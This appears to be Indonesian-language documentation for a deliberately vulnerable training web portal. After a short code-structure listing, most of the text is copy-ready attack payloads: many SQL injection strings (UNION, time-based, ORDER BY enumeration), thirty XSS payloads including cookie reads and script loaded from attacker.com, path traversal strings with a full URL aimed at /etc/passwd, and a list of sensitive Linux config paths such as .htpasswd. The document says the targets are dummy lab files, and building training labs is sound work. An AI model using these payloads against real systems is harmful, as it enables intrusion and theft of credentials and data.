

## Struktur kode

```text
src/app/[[...path]]/route.js   Next.js Route Handlers, URL lama
src/lib/handler.mjs           HTTP, autentikasi, CRUD, download
src/lib/auth.mjs              sesi, RBAC, scope record
src/lib/db.mjs                MariaDB pool, seed, reset, audit
src/lib/views.mjs             render markup halaman lama
src/lib/login.html            markup login asli
src/lib/chart.html            grafik SVG asli
src/lib/config.mjs            modul, halaman, akun demo, tabel
src/lib/schema.sql            skema MariaDB dengan AUTO_INCREMENT
src/lib/lab-files.mjs         20 fixture konfigurasi Linux dummy
src/lib/seed.json             seed dummy asli
src/lib/report.mjs            integrasi worker ekspor lab
src/lib/services.mjs          simulator FTP/DNS/HTTP
public/static/               CSS dan SVG asli
server.mjs                   custom server Node.js 22
lab/                         container worker RCE opsional
```


# Referensi payload umum

Arsip daftar payload awal. 



## Generic SQL Injection Payloads

```sql
'
''
`
``
,
"
""
/
//
\
\\
;
' or "
-- or # 
' OR '1
' OR 1 -- -
" OR "" = "
" OR 1 = 1 -- -
' OR '' = '
' OR 1=1 #
'='
'LIKE'
'=0--+
 OR 1=1
' OR 'x'='x
' AND id IS NULL; --
'''''''''''''UNION SELECT '2
%00
/*…*/ 
+  addition, concatenate (or space in url)
||  (double pipe) concatenate
%  wildcard attribute indicator

@variable local variable
@@variable global variable
```

### Numeric

```sql
AND 1
AND 0
AND true
AND false
1-false
1-true
1*56
-2
```

### Table and Column Discovery

```sql
1' ORDER BY 1--+
1' ORDER BY 2--+
1' ORDER BY 3--+

1' ORDER BY 1,2--+
1' ORDER BY 1,2,3--+

1' GROUP BY 1,2,--+
1' GROUP BY 1,2,3--+
' GROUP BY columnnames having 1=1 --

-1' UNION SELECT 1,2,3--+
' UNION SELECT sum(columnname ) from tablename --

-1 UNION SELECT 1 INTO @,@
-1 UNION SELECT 1 INTO @,@,@

1 AND (SELECT * FROM Users) = 1 

' AND MID(VERSION(),1,1) = '5';

' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --
```

### Time-Based

```sql
,(select * from (select(sleep(10)))a)
%2c(select%20*%20from%20(select(sleep(10)))a)
';WAITFOR DELAY '0:0:30'--
```

### Comments

```sql
#     Hash comment
/*   C-style comment
-- - SQL comment
;%00 Nullbyte
`     Backtick
```

## Generic Error Based Payloads

```sql
 OR 1=1
 OR 1=0
 OR x=x
 OR x=y
 OR 1=1#
 OR 1=0#
 OR x=x#
 OR x=y#
 OR 1=1-- 
 OR 1=0-- 
 OR x=x-- 
 OR x=y-- 
 OR 3409=3409 AND ('pytW' LIKE 'pytW
 OR 3409=3409 AND ('pytW' LIKE 'pytY
 HAVING 1=1
 HAVING 1=0
 HAVING 1=1#
 HAVING 1=0#
 HAVING 1=1-- 
 HAVING 1=0-- 
 AND 1=1
 AND 1=0
 AND 1=1-- 
 AND 1=0-- 
 AND 1=1#
 AND 1=0#
 AND 1=1 AND '%'='
 AND 1=0 AND '%'='
 AND 1083=1083 AND (1427=1427
 AND 7506=9091 AND (5913=5913
 AND 1083=1083 AND ('1427=1427
 AND 7506=9091 AND ('5913=5913
 AND 7300=7300 AND 'pKlZ'='pKlZ
 AND 7300=7300 AND 'pKlZ'='pKlY
 AND 7300=7300 AND ('pKlZ'='pKlZ
 AND 7300=7300 AND ('pKlZ'='pKlY
 AS INJECTX WHERE 1=1 AND 1=1
 AS INJECTX WHERE 1=1 AND 1=0
 AS INJECTX WHERE 1=1 AND 1=1#
 AS INJECTX WHERE 1=1 AND 1=0#
 AS INJECTX WHERE 1=1 AND 1=1--
 AS INJECTX WHERE 1=1 AND 1=0--
 WHERE 1=1 AND 1=1
 WHERE 1=1 AND 1=0
 WHERE 1=1 AND 1=1#
 WHERE 1=1 AND 1=0#
 WHERE 1=1 AND 1=1--
 WHERE 1=1 AND 1=0--
```

### Order By Payloads

```sql
 ORDER BY 1-- 
 ORDER BY 2-- 
 ORDER BY 3-- 
 ORDER BY 4-- 
 ORDER BY 5-- 
 ORDER BY 6-- 
 ORDER BY 7-- 
 ORDER BY 8-- 
 ORDER BY 9-- 
 ORDER BY 10-- 
 ORDER BY 11-- 
 ORDER BY 12-- 
 ORDER BY 13-- 
 ORDER BY 14-- 
 ORDER BY 15-- 
 ORDER BY 16-- 
 ORDER BY 17-- 
 ORDER BY 18-- 
 ORDER BY 19-- 
 ORDER BY 20-- 
 ORDER BY 21-- 
 ORDER BY 22-- 
 ORDER BY 23-- 
 ORDER BY 24-- 
 ORDER BY 25-- 
 ORDER BY 26-- 
 ORDER BY 27-- 
 ORDER BY 28-- 
 ORDER BY 29-- 
 ORDER BY 30-- 
 ORDER BY 31337-- 
 ORDER BY 1# 
 ORDER BY 2# 
 ORDER BY 3# 
 ORDER BY 4# 
 ORDER BY 5# 
 ORDER BY 6# 
 ORDER BY 7# 
 ORDER BY 8# 
 ORDER BY 9# 
 ORDER BY 10# 
 ORDER BY 11# 
 ORDER BY 12# 
 ORDER BY 13# 
 ORDER BY 14# 
 ORDER BY 15# 
 ORDER BY 16# 
 ORDER BY 17# 
 ORDER BY 18# 
 ORDER BY 19# 
 ORDER BY 20# 
 ORDER BY 21# 
 ORDER BY 22# 
 ORDER BY 23# 
 ORDER BY 24# 
 ORDER BY 25# 
 ORDER BY 26# 
 ORDER BY 27# 
 ORDER BY 28# 
 ORDER BY 29# 
 ORDER BY 30#
 ORDER BY 31337#
 ORDER BY 1 
 ORDER BY 2 
 ORDER BY 3 
 ORDER BY 4 
 ORDER BY 5 
 ORDER BY 6 
 ORDER BY 7 
 ORDER BY 8 
 ORDER BY 9 
 ORDER BY 10 
 ORDER BY 11 
 ORDER BY 12 
 ORDER BY 13 
 ORDER BY 14 
 ORDER BY 15 
 ORDER BY 16 
 ORDER BY 17 
 ORDER BY 18 
 ORDER BY 19 
 ORDER BY 20 
 ORDER BY 21 
 ORDER BY 22 
 ORDER BY 23 
 ORDER BY 24 
 ORDER BY 25 
 ORDER BY 26 
 ORDER BY 27 
 ORDER BY 28 
 ORDER BY 29 
 ORDER BY 30 
 ORDER BY 31337 
```





# Kumpulan Payload XSS

Setiap payload disajikan dalam blok kode tersendiri agar mudah disalin dari Markdown viewer yang mendukung tombol Copy. Gunakan hanya pada lingkungan pengujian yang diizinkan.

### Payload 1

```html
<script>alert(1)</script>
```

### Payload 2

```html
<script>alert('XSS')</script>
```

### Payload 3

```html
<script>alert("XSS")</script>
```

### Payload 4

```html
<script>alert(document.cookie)</script>
```

### Payload 5

```html
<script>alert(window.location)</script>
```

### Payload 6

```html
<SCRIPT>alert(1)</SCRIPT>
```

### Payload 7

```html
<ScRiPt>alert(1)</sCrIpT>
```

### Payload 8

```html
<script>confirm(1)</script>
```

### Payload 9

```html
<script>prompt(1)</script>
```

### Payload 10

```html
<script src="http://attacker.com/xss.js"></script>
```

### Payload 11

```html
<script/src="http://attacker.com/xss.js"></script>
```

### Payload 12

```html
<script>eval(atob('YWxlcnQoMSk='))</script>
```

### Payload 13

```html
<script>setTimeout(function(){alert(1)},100)</script>
```

### Payload 14

```html
<script>/* */alert(1)//</script>
```

### Payload 15

```html
<script>
alert(1)
</script>
```

### Payload 16

```html
<script>alert(1)</script>
```

### Payload 17

```html
<script>alert('XSS')</script>
```

### Payload 18

```html
<script>alert("XSS")</script>
```

### Payload 19

```html
<script>alert(document.cookie)</script>
```

### Payload 20

```html
<script>alert(window.location)</script>
```

### Payload 21

```html
<SCRIPT>alert(1)</SCRIPT>
```

### Payload 22

```html
<ScRiPt>alert(1)</sCrIpT>
```

### Payload 23

```html
<script>confirm(1)</script>
```

### Payload 24

```html
<script>prompt(1)</script>
```

### Payload 25

```html
<script src="http://attacker.com/xss.js"></script>
```

### Payload 26

```html
<script/src="http://attacker.com/xss.js"></script>
```

### Payload 27

```html
<script>eval(atob('YWxlcnQoMSk='))</script>
```

### Payload 28

```html
<script>setTimeout(function(){alert(1)},100)</script>
```

### Payload 29

```html
<script>/* */alert(1)//</script>
```

### Payload 30

```html
<script>
alert(1)
</script>
```






## Payload Path Traversal siap pakai di portal

Setelah login dengan role apa saja, buka **Document Center**, lalu klik URL dokumen. Ganti nilai parameter `file` di address bar dengan salah satu payload berikut dan tekan Enter. Semua target berikut mengembalikan file **dummy** untuk latihan.


### File passwd dummy

```text
../../../../../etc/passwd
```

### Konfigurasi MariaDB dummy

```text
../../../../../etc/mysql/my.cnf
```

### Konfigurasi cron dummy

```text
../../../../../etc/crontab
```

### Konfigurasi FTP dummy

```text
../../../../../etc/vsftpd.conf
```

Contoh URL lengkap:

```text
http://localhost:3000/document/download?file=../../../../../etc/passwd
```

Ganti `localhost` dengan IP host Docker jika diakses dari komputer siswa.

# 20 Path Konfigurasi Linux untuk Praktik Path Transversal

Dipilih dari daftar file yang diunggah berdasarkan relevansi untuk latihan audit Linux/web. **Bukan peringkat frekuensi statistik.** Keberadaan file bergantung pada sistem dan paket yang terpasang. Gunakan hanya pada lab yang diizinkan.

### 1. `/etc/crontab`

```text
/etc/crontab
```

### 2. `/etc/anacrontab`

```text
/etc/anacrontab
```

### 3. `/etc/shells`

```text
/etc/shells
```

### 4. `/etc/ssh/ssh_config`

```text
/etc/ssh/ssh_config
```

### 5. `/etc/ssh/moduli`

```text
/etc/ssh/moduli
```

### 6. `/etc/apache2/apache2.conf`

```text
/etc/apache2/apache2.conf
```

### 7. `/etc/apache2/.htpasswd`

```text
/etc/apache2/.htpasswd
```

### 8. `/etc/apache2/envvars`

```text
/etc/apache2/envvars
```

### 9. `/etc/apache2/sites-available/default`

```text
/etc/apache2/sites-available/default
```

### 10. `/etc/apache2/mods-available/ssl.conf`

```text
/etc/apache2/mods-available/ssl.conf
```

### 11. `/etc/apache2/mods-available/proxy.conf`

```text
/etc/apache2/mods-available/proxy.conf
```

### 12. `/etc/apache2/mods-available/php4.conf`

```text
/etc/apache2/mods-available/php4.conf
```

### 13. `/etc/mysql/my.cnf`

```text
/etc/mysql/my.cnf
```

### 14. `/etc/mysql/debian-start`

```text
/etc/mysql/debian-start
```

### 15. `/etc/postgresql/pg_hba.conf`

```text
/etc/postgresql/pg_hba.conf
```

### 16. `/etc/postgresql/pg_ident.conf`

```text
/etc/postgresql/pg_ident.conf
```

### 17. `/etc/postgresql/postgresql.env`

```text
/etc/postgresql/postgresql.env
```

### 18. `/etc/vsftpd.conf`

```text
/etc/vsftpd.conf
```

### 19. `/etc/pam.d/vsftpd`

```text
/etc/pam.d/vsftpd
```

### 20. `/etc/default/proftpd`

```text
/etc/default/proftpd
```
